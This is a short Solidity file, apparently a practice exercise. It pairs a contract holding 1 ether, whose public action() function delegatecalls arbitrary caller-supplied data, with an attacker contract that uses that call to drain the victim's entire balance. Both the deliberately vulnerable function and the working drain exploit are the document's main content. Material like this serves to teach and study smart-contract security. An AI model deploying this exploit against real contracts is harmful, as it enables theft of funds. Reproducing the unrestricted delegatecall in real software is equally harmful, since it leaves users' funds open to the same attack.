// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.28;

import {console} from "forge-std/console.sol";

contract GetEther {

    function getEther(HasEther hasEther) public {
       bytes memory data = abi.encodeWithSelector(this.drain.selector,address(this)); 
     hasEther.action(address(this),data);
    }

    receive()  external payable {}

    function drain(address to) public {
    console.log(msg.sender , ",sender in action ");
    (bool ok ,) = payable(to).call{value:address(this).balance}("");
    require(ok,"transfer Failed");
    }

}

contract HasEther {

error NotEnoughEther();
constructor () payable {
    require(address(this).balance == 1 ether , NotEnoughEther());
}

function action(address to , bytes calldata data ) public {
    console.log("action called");
    console.log(msg.sender , ",sender in action ");
    console.log(address(this).balance ,"balance in action ");
    (bool success,) = address(to).delegatecall(data);
    require(success , "FAILED");
}

}